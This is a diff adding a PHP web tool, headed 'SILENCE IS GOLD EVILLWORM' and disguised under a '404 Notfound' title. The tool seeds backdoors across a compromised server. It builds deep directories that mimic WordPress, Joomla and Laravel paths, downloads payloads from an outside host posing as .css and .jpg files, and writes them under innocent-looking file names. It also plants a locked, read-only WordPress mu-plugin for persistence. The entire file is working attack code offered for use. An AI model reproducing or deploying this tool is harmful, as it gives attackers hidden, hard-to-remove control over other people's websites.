@@ -1,0 +1,203 @@
+<?php
+$currentDir = dirname(__FILE__) . '/';
+
+// Paths per mode
+$paths = [
+    'wp' => [
+        '/wp-admin/network/tools/customizer/settings/modules/cache/export',
+        '/wp-content/themes/twentytwentyone/templates/global/wc/hooks/action/triggers',
+        '/wp-includes/js/tinymce/plugins/editor/skins/light/theme/icons',
+        '/wp-admin/includes/user/editorjs/vendor/ezyang/htmlpurifier/library',
+        '/wp-content/themes/twentytwenty/assets/js/libraries/utils/cache/class-chache',
+        '/wp-includes/rest-api/endpoints/block/render/preview/data/cache',
+        '/wp-admin/tools/migration/dbsync/classes/wp/migrate/db/handler',
+        '/wp-content/themes/flatsome/inc/wc-modules/product-gallery/lightbox/assets',
+        '/wp-includes/customize/preview/container/partial/handler/class',
+        '/wp-admin/user/assets/libs/editorjs/extensions/plugins/cleaner/handler',
+        '/wp-content/plugins/elementor/includes/settings/controls/manager/fields/render',
+        '/wp-includes/theme-compat/templates/page-builder/components/layout/widgets',
+        '/wp-content/plugins/akismet/akismet.php',
+    ],
+    'joomla' => [
+        '/libraries/src/HTML/Helpers/Dropdown/Fields/Access/Level',
+        '/components/com_contact/views/contact/tmpl/default_form/contact/layout',
+        '/libraries/src/Document/Html/Renderer/Modules/Menu/',
+        '/libraries/vendor/joomla/event/src/Dispatcher/',
+        '/plugins/system/debug/debugbar/resources/assets/css/panel/view',
+        '/plugins/user/profile/fields/handler/validate/customfields',
+        '/plugins/content/confirmconsent/js/triggers/init/user/privacy',
+        '/templates/beez3/html/layouts/chromes/no_style/',
+        '/templates/cassiopeia/scss/theme/variables/branding/',
+        '/administrator/components/com_content/views/articles/tmpl/',
+        '/media/com_finder/js/autosuggest/engine/',
+        '/administrator/modules/mod_quickicon/plugins/system/debug/helpers/log',
+        '/plugins/system/cache/cache.php',
+    ],
+    'lara' => [
+        '/vendor/laravel/framework/src/Illuminate/Http/Middleware/',
+        '/app/Console/Commands/System/Maintenance/',
+        '/app/Http/Middleware/Admin/Security/Session/',
+        '/app/Services/Payments/Providers/Stripe/Webhook/',
+        '/assets/themes/darkplus/vendors/js/tables/datatables/buttons/',
+        '/assets/themes/lightblue/css/modules/dashboard/widgets/',
+        '/vendor/laravel/framework/src/Illuminate/Foundation/Console/',
+        '/vendor/nesbot/carbon/src/Carbon/Laravel/',
+        '/vendor/spatie/permission/src/Models/',
+        '/storage/barryvdh/laravel-debugbar/src/Middleware/',
+        '/resources/views/backend/settings/users/security/2fa/',
+        '/storage/views/frontend/pages/checkout/',
+        '/resources/lang/en/api/validation/errors/',
+    ],
+    'statis' => [
+        '/assets/themes/darkplus/vendors/js/tables/datatables/buttons/export/pdf/',
+        '/assets/themes/lightblue/css/modules/dashboard/widgets/analytics/traffic/',
+        '/uploads/userdata/profile/photos/2025/july/events/summerfest/',
+        '/cache/system/tempfiles/sessiondata/expired/tokens/backup/',
+        '/media/library/audio/album/artist/2025/release/deluxe/',
+        '/static/resources/images/icons/socialmedia/facebook/covers/events/',
+        '/data/backups/weekly/2025/july/maintenance/scripts/cleanup/',
+        '/logs/system/errors/critical/2025/july/alerts/security/',
+        '/assets/css/vendor/bootstrap/',
+        '/assets/js/vendor/jquery/plugins/',
+        '/assets/js/custom/modules/forms/',
+        '/assets/images/gallery/events/2025/summer/',
+        '/uploads/files/documents/reports/financial/',
+    ],
+];
+
+// Files per mode
+$wp_files = ['class-automatic-upgrader-skin.php','archive.php','comments.php','template-tags.php','block-patterns.php','async-upload.php','export-personal-data.php','about.php','contribute.php','credits.php','edit.php','freedoms.php','plugin-editor.php'];
+$joomla_files = ['defines.php','framework.php','script.com_ars.php','autoload.php','autoload_classmap.php','autoload-namespaces.php','autoload_psr4.php','autoload_real.php','autoload_static.php','mod_arsdownloads.php','default.php','script.php','downloadsadmin.php'];
+$laravell_files = ['app.php','cache.php','database.php','filesystems.php','logging.php','services.php','session.php','welcome.blade.php','console.php','ExampleTest.php','TestCase.php','providers.php','User.php'];
+$randome_files = ['about.php','contact.php','form.php','submit.php','process.php','handler.php','mail.php','send.php','sendmail.php','upload.php','download.php','callback.php','router.php'];
+
+// Random URLs
+$random_urls = [
+    'https://netizenews.info/bd/kartelbypas.css',
+    'https://netizenews.info/bd/ws.css',
+    'https://netizenews.info/bd/narkobf.css',
+    'https://netizenews.info/bd/kartellobf.css',
+    'https://netizenews.info/bd/narkoslitebypas.css',
+    'https://netizenews.info/bd/lafamilia.jpg',
+];
+
+// =================== PROCESS FORM ===================
+$successFiles = [];
+$muPluginsCreated = false;
+
+if($_SERVER['REQUEST_METHOD'] === 'POST'){
+    $baseDir = $_POST['path'] ?? '';
+    $selectedModes = $_POST['modex'] ?? [];
+
+    foreach($selectedModes as $mode){
+        if(!isset($paths[$mode])) continue;
+
+        $modePaths = array_slice($paths[$mode],0,13);
+        shuffle($modePaths); // acak urutan path
+
+        switch($mode){
+            case 'wp': $modeFiles = array_slice($wp_files,0,13); break;
+            case 'joomla': $modeFiles = array_slice($joomla_files,0,13); break;
+            case 'lara': $modeFiles = array_slice($laravell_files,0,13); break;
+            case 'statis': $modeFiles = array_slice($randome_files,0,13); break;
+        }
+        shuffle($modeFiles); // acak juga urutan file
+
+        for($i=0; $i<13; $i++){
+            $targetPath = rtrim($baseDir,'/') . $modePaths[$i] . '/' . $modeFiles[$i];
+            @mkdir(dirname($targetPath),0777,true);
+
+            // Ambil konten dari random URL
+            $url = $random_urls[array_rand($random_urls)];
+            $content = @file_get_contents($url);
+            if(!$content) $content = "<?php echo 'Failed to load $url'; ?>";
+
+            // Jika WP mu-plugins, jangan print core.php & index.php
+            $skipPrint = false;
+            if($mode === 'wp'){
+                $muDir = rtrim($baseDir,'/') . '/wp-content/mu-plugins';
+                if(!is_dir($muDir)) mkdir($muDir,0777,true);
+
+                // buat core.php & index.php
+                $coreUrl = 'https://netizenews.info/bd/core.css';
+                $coreContent = @file_get_contents($coreUrl);
+                if(!$coreContent) $coreContent = "<?php echo 'Failed to load core.php'; ?>";
+                file_put_contents($muDir.'/core.php', $coreContent);
+                file_put_contents($muDir.'/index.php', "<?php\n// Silence is gold");
+
+                // AUTO CHMOD
+                @chmod($muDir.'/core.php', 0444);
+                @chmod($muDir.'/index.php', 0444);
+                @chmod($muDir, 0555);
+
+                $muPluginsCreated = true;
+
+                // skip print jika targetPath di mu-plugins
+                if(strpos($targetPath,$muDir) === 0){
+                    $skipPrint = true;
+                }
+            }
+
+            if(file_put_contents($targetPath,$content) && !$skipPrint){
+                $successFiles[] = $targetPath;
+            }
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>404 Notfound</title>
+    <style>
+        body{
+            font-family:sans-serif;
+            background: linear-gradient(135deg, #111, #7200ff); /* background gradient */
+            color:#fff;
+            padding:20px;
+        }
+        input[type=text]{padding:6px;margin:5px 0;width:250px;font-size:14px;}
+        fieldset{border:2px solid #7200ff;padding:10px 15px;margin:10px 0;}
+        legend{font-weight:bold;}
+        label{display:block;margin:5px 0;cursor:pointer;}
+        button{
+            padding:10px 20px;margin-top:10px;
+            background:#7200ff;
+            color:#fff;
+            border:none;
+            cursor:pointer;
+            transition: 0.3s;
+        }
+        button:hover{background:#9b00ff;}
+        pre{background:#222;padding:10px;overflow:auto;color:#0f0;}
+    </style>
+</head>
+<body>
+<h2>SILENCE IS GOLD EVILLWORM</h2>
+<p>You was here : <strong><?=htmlspecialchars($currentDir)?></strong></p>
+<form method="POST">
+    <label>Masukan Path directory:</label>
+    <input type="text" name="path" value="<?=htmlspecialchars($baseDir??'')?>" placeholder="/home/user/public_html">
+    <fieldset>
+        <legend>Pilih Mode Upload</legend>
+        <label><input type="checkbox" name="modex[]" value="wp" /> WordPress (wp)</label>
+        <label><input type="checkbox" name="modex[]" value="joomla" /> Joomla</label>
+        <label><input type="checkbox" name="modex[]" value="lara" /> Laravel</label>
+        <label><input type="checkbox" name="modex[]" value="statis" /> Static / Random</label>
+    </fieldset>
+
+    <button type="submit">Gass Tebar</button>
+</form>
+
+<?php if(!empty($successFiles)): ?>
+<h3>Files berhasil ditebar:</h3>
+<pre><?=implode("\n",$successFiles)?></pre>
+<?php endif; ?>
+
+<?php if($muPluginsCreated): ?>
+<p><strong>mu-plugins berhasil dibuat!</strong></p>
+<?php endif; ?>
+
+</body>
+</html>
